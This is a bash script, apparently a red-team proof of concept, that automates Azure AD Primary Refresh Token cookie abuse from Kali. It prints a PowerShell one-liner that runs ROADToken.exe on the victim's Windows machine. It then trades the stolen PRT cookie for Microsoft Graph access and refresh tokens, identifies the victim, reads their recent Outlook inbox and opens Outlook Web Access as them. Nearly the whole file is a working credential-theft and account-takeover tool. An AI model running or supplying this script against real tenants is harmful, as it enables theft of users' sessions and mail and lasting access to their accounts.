#!/bin/bash
# ─────────────────────────────────────────────────────────────────────────────
#  PRT Cookie Abuse — Kali side
#  You only need to run ROADToken.exe on the Windows target.
#  Everything else is handled here.
# ─────────────────────────────────────────────────────────────────────────────

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

ok()   { echo -e "${GREEN}[+]${NC} $*"; }
info() { echo -e "${CYAN}[*]${NC} $*"; }
warn() { echo -e "${YELLOW}[!]${NC} $*"; }
die()  { echo -e "${RED}[-]${NC} $*"; exit 1; }

TOKENFILE="tokens.json"
WORKDIR="$(pwd)/prt_session_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo -e "${BOLD}"
echo "╔══════════════════════════════════════════════════════╗"
echo "║         PRT Cookie Abuse PoC — Kali Workflow         ║"
echo "╚══════════════════════════════════════════════════════╝"
echo -e "${NC}"

# ── 1. CHECK / INSTALL DEPENDENCIES ──────────────────────────────────────────
info "Checking dependencies..."

# Python3
command -v python3 &>/dev/null || die "python3 not found"

# pip / roadtx
if ! command -v roadtx &>/dev/null; then
    warn "roadtx not found — installing..."
    pip install roadtx -q || die "pip install roadtx failed"
fi
ok "roadtx: $(roadtx --version 2>&1 | head -1)"

# Firefox
if ! command -v firefox &>/dev/null && ! command -v firefox-esr &>/dev/null; then
    warn "Firefox not found — installing firefox-esr..."
    sudo apt-get install -y firefox-esr -q || warn "Could not install Firefox — browser mode unavailable"
fi

# geckodriver — needs 0.36.0+ for Firefox 140+
GECKO_VER="0.36.0"
if command -v geckodriver &>/dev/null; then
    CURRENT=$(geckodriver --version 2>&1 | grep -oP '\d+\.\d+\.\d+' | head -1)
    if [ "$CURRENT" != "$GECKO_VER" ]; then
        warn "geckodriver $CURRENT detected — upgrading to $GECKO_VER for Firefox 140 compatibility..."
        GECKO_URL="https://github.com/mozilla/geckodriver/releases/download/v${GECKO_VER}/geckodriver-v${GECKO_VER}-linux64.tar.gz"
        wget -q "$GECKO_URL" -O /tmp/geckodriver.tar.gz \
            && tar xf /tmp/geckodriver.tar.gz -C /tmp \
            && sudo mv /tmp/geckodriver /usr/local/bin/geckodriver \
            && sudo chmod +x /usr/local/bin/geckodriver \
            && ok "geckodriver upgraded: $(geckodriver --version | head -1)" \
            || warn "Could not upgrade geckodriver"
    fi
else
    warn "geckodriver not found — installing $GECKO_VER..."
    GECKO_URL="https://github.com/mozilla/geckodriver/releases/download/v${GECKO_VER}/geckodriver-v${GECKO_VER}-linux64.tar.gz"
    wget -q "$GECKO_URL" -O /tmp/geckodriver.tar.gz \
        && tar xf /tmp/geckodriver.tar.gz -C /tmp \
        && sudo mv /tmp/geckodriver /usr/local/bin/geckodriver \
        && sudo chmod +x /usr/local/bin/geckodriver \
        && ok "geckodriver installed: $(geckodriver --version | head -1)" \
        || warn "Could not install geckodriver automatically"
fi

if command -v geckodriver &>/dev/null; then
    ok "geckodriver: $(geckodriver --version | head -1)"
else
    warn "geckodriver unavailable — will fall back to headless token exchange"
fi

echo ""

# ── 2. GET NONCE FROM AZURE AD ────────────────────────────────────────────────
info "Requesting fresh sso_nonce from Azure AD..."

NONCE=$(roadtx getnonce 2>&1)
# roadtx getnonce prints something like "Nonce: AQAB..." or just the nonce
NONCE=$(echo "$NONCE" | grep -oP '(?i)(?<=nonce:\s{0,5})[A-Za-z0-9._\-]+' | head -1)

if [ -z "$NONCE" ]; then
    # fallback: raw HTTP
    NONCE=$(python3 -c "
import urllib.request, urllib.parse, json
url = 'https://login.microsoftonline.com/common/oauth2/token'
data = urllib.parse.urlencode({'grant_type':'srv_challenge'}).encode()
req = urllib.request.Request(url, data=data)
req.add_header('Content-Type','application/x-www-form-urlencoded')
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        nonce = r.headers.get('x-ms-request-nonce','')
        if not nonce:
            body = json.loads(r.read())
            nonce = body.get('Nonce','')
        print(nonce.strip())
except:
    pass
" 2>/dev/null)
fi

[ -z "$NONCE" ] && die "Could not get nonce from Azure AD — check internet connection"
ok "Nonce obtained"

# Save nonce for reference
echo "$NONCE" > nonce.txt

PS_ONELINER="\$o=(.\ROADToken.exe \"${NONCE}\" 2>\$null)-join\"\"; \$s=\$o.IndexOf('{'); \$e=\$o.LastIndexOf('}'); \$j=\$o.Substring(\$s,\$e-\$s+1)|ConvertFrom-Json; \$cookies=\$j.response|?{\$_.name-like\"x-ms-RefreshTokenCredential*\"} ; Write-Host \"\`n=== ACCOUNTS FOUND: \$(\$cookies.Count) ===\" -ForegroundColor Cyan; \$i=0; \$cookies|%{ Write-Host \"\`n[Account \$i] \$(\$_.name)\" -ForegroundColor Yellow; Write-Host \$_.data; \$i++ }; \$cookies[0].data|Set-Clipboard; Write-Host \"\`n[Clipboard] = Account 0 (primary)\" -ForegroundColor Green"

echo ""
echo -e "${BOLD}${YELLOW}"
echo "╔══════════════════════════════════════════════════════════════════════╗"
echo "║       !! COPY THIS ONE-LINER AND RUN IT IN WINDOWS POWERSHELL !!    ║"
echo "║                    ⚠  expires in ~5 minutes                        ║"
echo "╠══════════════════════════════════════════════════════════════════════╣"
echo ""
echo -e "${NC}${CYAN}${PS_ONELINER}${NC}"
echo ""
echo -e "${BOLD}${YELLOW}"
echo "╠══════════════════════════════════════════════════════════════════════╣"
echo "║  It will print the JWT and copy it to clipboard automatically.      ║"
echo "║  Then paste it back here.                                           ║"
echo "╚══════════════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Save to file for easy cat/copy
echo "$PS_ONELINER" > windows_command.txt
echo -e "  ${CYAN}(also saved to: $WORKDIR/windows_command.txt)${NC}"
echo ""

# ── 3. COLLECT OUTPUT FROM USER ───────────────────────────────────────────────
echo ""
read -p "$(echo -e ${BOLD})Paste ROADToken.exe output here then press ENTER: $(echo -e ${NC})" RAW_OUTPUT

[ -z "$RAW_OUTPUT" ] && die "No input received"

# ── 4. EXTRACT PRT COOKIE ────────────────────────────────────────────────────
info "Parsing all PRT cookies from output..."

# Extract all x-ms-RefreshTokenCredential* cookies into an array
mapfile -t ALL_COOKIES < <(python3 -c "
import json, sys, re, base64

raw = sys.argv[1]

def decode_cookie(cookie):
    parts = cookie.split('.')
    pad = lambda s: s + '=' * (-len(s) % 4)
    try:
        payload = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
        return payload.get('is_primary','?'), payload.get('win_ver','?')
    except:
        return '?', '?'

cookies = []

# Method 1: JSON parse
try:
    # strip garbage prefix
    s = raw.index('{'); e = raw.rindex('}')
    data = json.loads(raw[s:e+1])
    for item in data.get('response', []):
        if item.get('name','').startswith('x-ms-RefreshTokenCredential'):
            cookies.append((item['name'], item['data']))
except:
    pass

# Method 2: regex fallback
if not cookies:
    for m in re.finditer(r'\"name\":\"(x-ms-RefreshTokenCredential[^\"]*)\",\"data\":\"([A-Za-z0-9\-_\.]+)\"', raw):
        cookies.append((m.group(1), m.group(2)))

# Method 3: raw JWT pasted directly
if not cookies and raw.strip().startswith('eyJ') and raw.strip().count('.') >= 2:
    cookies.append(('x-ms-RefreshTokenCredential', raw.strip()))

for name, data in cookies:
    print(data)
" "$RAW_OUTPUT" 2>/dev/null)

if [ ${#ALL_COOKIES[@]} -eq 0 ]; then
    die "Could not extract any PRT cookies. Make sure you copied the full output from the Windows command."
fi

ok "Found ${#ALL_COOKIES[@]} PRT cookie(s)"
echo ""

# Show all accounts decoded
for i in "${!ALL_COOKIES[@]}"; do
    echo -e "  ${CYAN}[Account $i]${NC}"
    python3 -c "
import base64, json, sys
cookie = sys.argv[1]
parts = cookie.split('.')
pad = lambda s: s + '=' * (-len(s) % 4)
try:
    h = json.loads(base64.urlsafe_b64decode(pad(parts[0])))
    p = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
    print('    alg       :', h.get('alg'))
    print('    kdf_ver   :', h.get('kdf_ver','n/a'))
    print('    is_primary:', p.get('is_primary'))
    print('    win_ver   :', p.get('win_ver','n/a'))
    print('    has_nonce :', 'request_nonce' in p)
except Exception as e:
    print('    (decode error:', e, ')')
" "${ALL_COOKIES[$i]}"
    echo ""
done

# Save all cookies
for i in "${!ALL_COOKIES[@]}"; do
    echo "${ALL_COOKIES[$i]}" > "prt_cookie_account${i}.txt"
done
ok "Cookies saved: prt_cookie_account0.txt ... prt_cookie_account$((${#ALL_COOKIES[@]}-1)).txt"

# Auto-select the best usable cookie (is_primary=true = active PRT session)
# Accounts without is_primary asked for password on the victim machine → not usable
BEST_IDX=0
for i in "${!ALL_COOKIES[@]}"; do
    IS_PRIMARY=$(python3 -c "
import base64, json, sys
cookie = sys.argv[1]
parts = cookie.split('.')
pad = lambda s: s + '=' * (-len(s) % 4)
try:
    p = json.loads(base64.urlsafe_b64decode(pad(parts[1])))
    print(p.get('is_primary','false'))
except:
    print('false')
" "${ALL_COOKIES[$i]}" 2>/dev/null)
    if [ "$IS_PRIMARY" = "true" ]; then
        BEST_IDX=$i
        ok "Account $i has active PRT (is_primary=true) — usable"
    else
        warn "Account $i has no active PRT (is_primary≠true) — will ask for password, skipping"
    fi
done

PRT_COOKIE="${ALL_COOKIES[$BEST_IDX]}"
echo ""
echo -e "  ${GREEN}Targeting Account ${BEST_IDX} (active PRT session)${NC}"
echo ""

# ── 5. AUTHENTICATE ───────────────────────────────────────────────────────────
info "Authenticating with Azure AD using PRT cookie..."

AUTH_OK=false

# Method A: roadtx browserprtauth (with geckodriver)
if command -v geckodriver &>/dev/null; then
    info "Trying roadtx browserprtauth (geckodriver mode)..."
    roadtx browserprtauth \
        --prt-cookie "$PRT_COOKIE" \
        -r https://graph.microsoft.com \
        --tokenfile "$TOKENFILE" 2>&1 | tee /tmp/roadtx_auth.log

    # roadtx writes camelCase keys (accessToken) not snake_case (access_token)
    if [ -f "$TOKENFILE" ] && python3 -c "
import json
t = json.load(open('$TOKENFILE'))
assert t.get('access_token') or t.get('accessToken')
" 2>/dev/null; then
        ok "roadtx browserprtauth succeeded"
        AUTH_OK=true
    else
        warn "browserprtauth did not produce tokens — trying direct exchange..."
    fi
fi

# Method B: direct HTTP exchange (no browser needed)
if [ "$AUTH_OK" = false ]; then
    info "Trying direct token exchange via HTTP..."
    python3 -c "
import urllib.request, urllib.parse, json, sys

cookie = sys.argv[1]
tokenfile = sys.argv[2]

# Try multiple client_id + resource combos known to work with nativeclient redirect
attempts = [
    {
        'client_id':    '1b730954-1685-4b74-9bfd-dac224a7b894',
        'resource':     'https://graph.microsoft.com',
        'redirect_uri': 'urn:ietf:wg:oauth:2.0:oob',
    },
    {
        'client_id':    '29d9ed98-a469-4536-ade2-f981bc1d605e',
        'resource':     'https://graph.microsoft.com',
        'redirect_uri': 'https://login.microsoftonline.com/common/oauth2/nativeclient',
    },
    {
        'client_id':    '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
        'resource':     'https://graph.microsoft.com',
        'redirect_uri': 'https://management.core.windows.net/',
    },
]

for attempt in attempts:
    params = {
        'grant_type':   'urn:ietf:params:oauth:grant-type:jwt-bearer',
        'assertion':    cookie,
        'client_id':    attempt['client_id'],
        'resource':     attempt['resource'],
        'redirect_uri': attempt['redirect_uri'],
        'scope':        'openid',
    }
    req = urllib.request.Request(
        'https://login.microsoftonline.com/common/oauth2/token',
        data=urllib.parse.urlencode(params).encode(),
        headers={
            'Content-Type': 'application/x-www-form-urlencoded',
            'x-ms-RefreshTokenCredential': cookie,
        }
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            t = json.loads(r.read())
            if 'access_token' in t:
                json.dump(t, open(tokenfile, 'w'), indent=2)
                print('[+] SUCCESS with client_id:', attempt['client_id'])
                print('[+] access_token :', t['access_token'][:60] + '...')
                print('[+] refresh_token:', t.get('refresh_token','n/a')[:60] + '...')
                sys.exit(0)
    except urllib.error.HTTPError as e:
        err = e.read().decode()
        print('[-] Failed client_id', attempt['client_id'], ':', err[:120])
    except Exception as e:
        print('[-] Error:', e)

print('[-] All direct exchange attempts failed')
sys.exit(1)
" "$PRT_COOKIE" "$TOKENFILE" && AUTH_OK=true
fi

echo ""

# ── 6. USE THE TOKENS ─────────────────────────────────────────────────────────
if [ "$AUTH_OK" = false ] || [ ! -f "$TOKENFILE" ]; then
    die "Authentication failed. The nonce may have expired — rerun the script and use ROADToken.exe faster (within 5 min)."
fi

ok "tokens.json created"

ACCESS=$(python3 -c "
import json
t = json.load(open('$TOKENFILE'))
print(t.get('access_token') or t.get('accessToken',''))
" 2>/dev/null)
REFRESH=$(python3 -c "
import json
t = json.load(open('$TOKENFILE'))
rt = t.get('refresh_token') or t.get('refreshToken','n/a')
print(str(rt)[:60])
" 2>/dev/null)

[ -z "$ACCESS" ] && die "No access_token in tokens.json"

echo ""
echo -e "${BOLD}${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "  TOKENS OBTAINED"
echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
python3 -c "
import json
t = json.load(open('$TOKENFILE'))
# roadtx uses camelCase keys
exp  = t.get('expiresIn')  or t.get('expires_in')
typ  = t.get('tokenType')  or t.get('token_type')
scp  = t.get('scope','')
rt   = t.get('refreshToken') or t.get('refresh_token')
print('  expires_in   :', exp, 'seconds')
print('  token_type   :', typ)
print('  scope        :', str(scp)[:80])
print('  refresh_token:', 'YES — 90 day rolling validity' if rt else 'NO')
"
echo ""

# ── 7. WHO AM I ───────────────────────────────────────────────────────────────
info "Identifying victim account..."
python3 -c "
import urllib.request, json, sys
token = sys.argv[1]
url = 'https://graph.microsoft.com/v1.0/me?%24select=displayName,mail,userPrincipalName,jobTitle,officeLocation'
req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + token})
try:
    with urllib.request.urlopen(req, timeout=10) as r:
        me = json.loads(r.read())
    print()
    print('  Name  :', me.get('displayName'))
    print('  Email :', me.get('mail') or me.get('userPrincipalName'))
    print('  Title :', me.get('jobTitle', 'n/a'))
except Exception as e:
    print('  Graph /me failed:', e)
" "$ACCESS"

echo ""

# ── 8. READ OUTLOOK INBOX ────────────────────────────────────────────────────
info "Reading victim Outlook inbox (last 10 messages)..."
python3 -c "
import urllib.request, json, sys
token = sys.argv[1]
url = ('https://graph.microsoft.com/v1.0/me/messages'
       '?%24top=10'
       '&%24select=subject,from,receivedDateTime,isRead'
       '&%24orderby=receivedDateTime%20desc')
req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + token})
try:
    with urllib.request.urlopen(req, timeout=15) as r:
        data = json.loads(r.read())
    msgs = data.get('value', [])
    print()
    print(f'  Found {len(msgs)} messages:')
    print()
    for m in msgs:
        sender  = m.get('from',{}).get('emailAddress',{}).get('address','?')
        subject = m.get('subject','(no subject)')
        date    = m.get('receivedDateTime','')[:10]
        read    = '' if m.get('isRead') else '[UNREAD] '
        print(f'  {date}  {read}{sender}')
        print(f'           {subject}')
        print()
except Exception as e:
    print('  Inbox read failed:', e)
" "$ACCESS"

# ── 9. OPEN OWA IN BROWSER ───────────────────────────────────────────────────
echo ""
info "Opening OWA in browser as victim..."
if command -v geckodriver &>/dev/null; then
    roadtx browserprtauth \
        --prt-cookie "$PRT_COOKIE" \
        -url "https://outlook.office365.com/mail/" \
        -k 2>/dev/null &
    ok "Browser launched — Firefox will open OWA as ${BOLD}$(python3 -c "
import json
t=json.load(open('$TOKENFILE'))
print(t.get('userId') or t.get('upn','victim'))
" 2>/dev/null)${NC}"
else
    warn "geckodriver not available — open browser manually:"
    echo ""
    echo -e "  1. Open Firefox DevTools at ${CYAN}https://login.microsoftonline.com${NC}"
    echo -e "  2. Storage → Cookies → Add:"
    echo -e "     Name:  x-ms-RefreshTokenCredential"
    echo -e "     Value: $(cat prt_cookie.txt)"
    echo -e "  3. Navigate to ${CYAN}https://outlook.office365.com/mail/${NC}"
fi

# ── 10. SUMMARY ───────────────────────────────────────────────────────────────
echo ""
echo -e "${BOLD}${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo -e "  PoC COMPLETE — SESSION ARTIFACTS"
echo -e "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""
echo -e "  Working dir  : $WORKDIR"
echo -e "  tokens.json  : access + refresh token (90-day rolling)"
echo -e "  prt_cookie   : prt_cookie.txt"
echo ""
echo -e "  Refresh tokens anytime (no target needed):"
echo -e "  ${CYAN}cd $WORKDIR && roadtx gettokens -t tokens.json -r https://graph.microsoft.com${NC}"
echo ""
echo -e "  Re-open OWA later:"
echo -e "  ${CYAN}cd $WORKDIR && roadtx browserprtauth --prt-cookie \$(cat prt_cookie.txt) -url https://outlook.office365.com/mail/ -k${NC}"
echo ""
